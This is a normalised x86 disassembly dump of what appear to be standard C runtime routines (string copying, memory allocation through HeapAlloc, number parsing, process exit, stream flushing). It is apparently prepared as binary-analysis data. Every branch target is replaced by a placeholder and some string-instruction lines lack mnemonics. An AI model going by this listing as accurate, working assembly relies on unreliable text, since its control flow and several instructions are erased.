mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne rwxdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je rwxdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je rwxdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je rwxdata
jmp rwxdata
sub_4064e0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_406540 ]
jmp [ ecx * 4 + jump_table_4065bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406628 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406628 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4067c0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4066c8 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4067c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406628 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406628 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406628 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4067c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4067c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4067c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4067c0 ]
sub_4068de
cmp [ esp + 0x4 ] 0xffffffe0
ja rwxdata
xor eax eax
push [ esp + 0x4 ]
call sub_40690a
test eax eax
pop ecx
jne rwxdata
retn
cmp [ esp + 0x8 ] eax
je rwxdata
push [ esp + 0x4 ]
call sub_4098ca
test eax eax
pop ecx
jne rwxdata
sub_40690a
mov eax [ rwxdata ]
push esi
mov esi [ esp + 0x8 ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
test esi esi
jne rwxdata
mov eax [ esp + 0x8 ]
test eax eax
je rwxdata
push esi
call sub_407ea6
test eax eax
pop ecx
je rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp rwxdata
pop esi
retn
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov eax esi
shr eax 0x4
push eax
call sub_408949
test eax eax
pop ecx
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
pop esi
retn
jmp rwxdata
sub_40697e
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
jne rwxdata
mov esi [ ebp + 0xc ]
test esi esi
jne rwxdata
push [ ebp + 0xc ]
call sub_4068cc
pop ecx
jmp rwxdata
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
push [ ebp + 0x8 ]
call sub_406295
pop ecx
jmp rwxdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja rwxdata
cmp esi 0xffffffe0
ja rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
push [ ebp + 0x8 ]
call sub_407b52
mov ebx eax
pop ecx
test ebx ebx
je rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
test esi esi
jne rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
test esi esi
jbe rwxdata
mov eax edi
jmp rwxdata
push esi
call sub_4098ca
test eax eax
pop ecx
jne rwxdata
test esi esi
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
push esi
call sub_4098ca
test eax eax
pop ecx
jne rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
test eax eax
jne rwxdata
push 0x1
pop esi
cmp [ rwxdata ] 0x0
je rwxdata
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_4088ad
mov ebx eax
add esp 0xc
test ebx ebx
je rwxdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp rwxdata
jmp rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne rwxdata
mov edi [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_40835b
add esp 0xc
test eax eax
jne rwxdata
push esi
call sub_4098ca
test eax eax
pop ecx
jne rwxdata
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
cmp esi [ rwxdata ]
jae rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je rwxdata
push 0x1
pop esi
test edi edi
jne rwxdata
push esi
call sub_407ea6
mov edi eax
pop ecx
test edi edi
je rwxdata
jmp rwxdata
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je rwxdata
mov edi esi
shr edi 0x4
push edi
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_408c75
add esp 0x10
test eax eax
je rwxdata
test ebx ebx
jne rwxdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x4 ]
dec eax
cmp eax esi
jb rwxdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb rwxdata
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb rwxdata
push edi
call sub_408949
mov edi eax
pop ecx
test edi edi
je rwxdata
mov edi [ ebp + 0x8 ]
jmp rwxdata
test edi edi
jne rwxdata
push eax
push ecx
push edi
call sub_4064e0
push [ ebp + 0x8 ]
push ebx
call sub_407b7d
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_4064e0
push ebx
call sub_407b52
push [ ebp + 0x8 ]
mov ebx eax
push ebx
call sub_407b7d
add esp 0x18
mov eax esi
push eax
push [ ebp + 0x8 ]
push edi
call sub_4064e0
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_408904
add esp 0x18
jmp rwxdata
mov eax esi
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb rwxdata
test edi edi
jne rwxdata
test edi edi
jne rwxdata
push eax
push [ ebp + 0x8 ]
push edi
call sub_4064e0
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_408904
add esp 0x18
mov eax esi
sub_406c35
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne rwxdata
mov bl [ esi ]
inc esi
jmp rwxdata
test eax eax
je rwxdata
cmp bl 0x2b
jne rwxdata
or [ ebp + 0x14 ] 0x2
jmp rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
mov eax [ ebp + 0x10 ]
test eax eax
jl rwxdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je rwxdata
cmp eax 0x1
je rwxdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg rwxdata
push 0x10
test eax eax
pop ecx
jne rwxdata
cmp [ ebp + 0x10 ] ecx
jne rwxdata
cmp bl 0x30
je rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] 0xa
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
movsx ecx bl
sub ecx 0x30
jmp rwxdata
test eax eax
je rwxdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne rwxdata
mov [ ebp + 0x10 ] 0x8
jmp rwxdata
mov eax [ rwxdata ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
cmp ecx [ ebp + 0x10 ]
jae rwxdata
mov ecx [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
test cl 0x8
jne rwxdata
movsx eax bl
push eax
call sub_4098e5
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je rwxdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb rwxdata
test cl 0x4
mov eax 0x7fffffff
jne rwxdata
test edx edx
je rwxdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne rwxdata
test [ ebp + 0x14 ] 0x1
mov [ rwxdata ] 0x22
je rwxdata
test cl 0x1
jne rwxdata
and [ ebp - 0x8 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rwxdata ] 0x1
movzx esi bl
jle rwxdata
or [ ebp + 0x14 ] 0x4
jmp rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe rwxdata
mov ecx [ ebp + 0x14 ]
and cl 0x2
neg cl
sbb ecx ecx
neg ecx
add ecx eax
mov [ ebp - 0x8 ] ecx
or [ ebp - 0x8 ] 0xffffffff
jmp rwxdata
test edx edx
je rwxdata
and ecx 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp rwxdata
test [ ebp + 0x14 ] 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
test ecx ecx
jne rwxdata
cmp [ ebp - 0x8 ] 0x80000000
ja rwxdata
mov eax [ ebp - 0x8 ]
jmp rwxdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] eax
jbe rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_406e8c
push edi
push 0x1
pop edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rwxdata ] edi
mov [ rwxdata ] bl
jne rwxdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rwxdata
push rwxdata
call sub_406f25
pop ecx
pop ecx
test ebx ebx
pop ebx
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rwxdata ] edi
call [ ExitProcess@IAT ]
push rwxdata
push rwxdata
call sub_406f25
pop ecx
pop ecx
mov ecx [ rwxdata ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb rwxdata
pop esi
mov eax [ esi ]
test eax eax
je rwxdata
sub esi 0x4
cmp esi [ rwxdata ]
jae rwxdata
call eax
sub_406f90
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je rwxdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb rwxdata
mov [ edi ] al
inc edi
dec edx
jne rwxdata
neg ecx
and ecx 0x3
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je rwxdata
sub edx ecx
[ edi ]
test edx edx
je rwxdata
mov [ edi ] al
inc edi
dec ecx
jne rwxdata
sub_406ff0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je rwxdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je rwxdata
sub eax 0x4
jb rwxdata
mov cl [ edx ]
inc edx
xor cl bl
je rwxdata
add eax 0x4
je rwxdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
dec eax
je rwxdata
mov cl [ edx ]
inc edx
xor cl bl
je rwxdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je rwxdata
test edx 0x3
jne rwxdata
dec eax
jne rwxdata
sub eax 0x4
jb rwxdata
mov ecx [ edx - 0x4 ]
xor cl bl
je rwxdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je rwxdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je rwxdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je rwxdata
pop edi
jmp rwxdata
sub_4070a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp rwxdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae rwxdata
mov al [ edx ]
or al al
je rwxdata
inc ecx
mov al [ esi ]
or al al
je rwxdata
sub_4070de
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ ebp + 0x14 ] edi
jle rwxdata
push edi
push edi
push 0x1
pop ebx
push ebx
push rwxdata
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x2
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_407302
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push rwxdata
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je rwxdata
mov [ rwxdata ] ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp rwxdata
xor eax eax
mov [ rwxdata ] 0x2
cmp [ ebp + 0x20 ] edi
jne rwxdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_409e70
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp - 0x24 ] edi
je rwxdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je rwxdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je rwxdata
test [ ebp + 0xd ] 0x4
je rwxdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_409e70
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp + 0x1c ] edi
je rwxdata
cmp ebx edi
je rwxdata
mov eax esi
jmp rwxdata
cmp esi [ ebp + 0x1c ]
jg rwxdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne rwxdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp rwxdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je rwxdata
sub_407302
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je rwxdata
cmp [ eax ] 0x0
pop esi
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne rwxdata
sub_40732d
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja rwxdata
mov ecx eax
push esi
mov esi [ rwxdata ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je rwxdata
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
jmp rwxdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp rwxdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_409e9f
add esp 0x1c
test eax eax
jne rwxdata
sub_4073a2
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je rwxdata
push edi
call sub_40a15d
cmp eax 0xffffffff
pop ecx
je rwxdata
xor ebp ebp
cmp edi 0x1
je rwxdata
xor eax eax
jmp rwxdata
push ebp
call sub_40a07c
pop ecx
jmp rwxdata
push 0x2
call sub_40a15d
push 0x1
mov ebp eax
call sub_40a15d
pop ecx
cmp eax ebp
pop ecx
je rwxdata
cmp edi 0x2
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40a15d
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne rwxdata
call [ GetLastError@IAT ]
mov ebp eax
jmp rwxdata
push edi
call sub_40a0e3
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je rwxdata
sub_407455
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
pop esi
retn
test al 0x8
je rwxdata
push [ esi + 0x8 ]
call sub_406295
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_407480
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne rwxdata
push esi
call sub_4074bb
test eax eax
pop ecx
je rwxdata
push esi
call sub_407520
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je rwxdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40a19a
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_4074bb
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne rwxdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je rwxdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle rwxdata
push edi
push eax
push [ esi + 0x10 ]
call sub_40a1f1
add esp 0xc
cmp eax edi
jne rwxdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je rwxdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp rwxdata
sub_407520
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rwxdata ] esi
jle rwxdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je rwxdata
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rwxdata ]
jl rwxdata
mov ecx [ eax + 0xc ]
test cl 0x83
je rwxdata
cmp [ esp + 0x10 ] 0x1
jne rwxdata
cmp [ esp + 0x10 ] 0x0
jne rwxdata
push eax
call sub_407480
cmp eax 0xffffffff
pop ecx
je rwxdata
test cl 0x2
je rwxdata
inc ebx
jmp rwxdata
push eax
call sub_407480
cmp eax 0xffffffff
pop ecx
jne rwxdata
or edi eax
sub_40758d
mov eax [ rwxdata ]
push esi
push 0x14
test eax eax
pop esi
jne rwxdata
cmp eax esi
jge rwxdata
mov eax 0x200
jmp rwxdata
push 0x4
push eax
call sub_40a485
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov eax esi
mov [ rwxdata ] eax
xor ecx ecx
mov eax rwxdata
push 0x4
push esi
mov [ rwxdata ] esi
call sub_40a485
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov edx [ rwxdata ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rwxdata
jl rwxdata
xor edx edx
mov ecx rwxdata
push 0x1a
call sub_4063f4
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne rwxdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rwxdata ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je rwxdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rwxdata
jl rwxdata
sub_407650
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_405e8d
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne rwxdata
push ecx
call sub_405e8d
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4076dd
mov esp [ ebp - 0x18 ]
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp rwxdata
push 0xa
call sub_4095f9
push 0x16
call sub_40b98f
pop ecx
pop ecx
push 0x3
call sub_406e7b
int3
sub_4076f2
push ebp
mov ebp esp
push ecx
push ecx
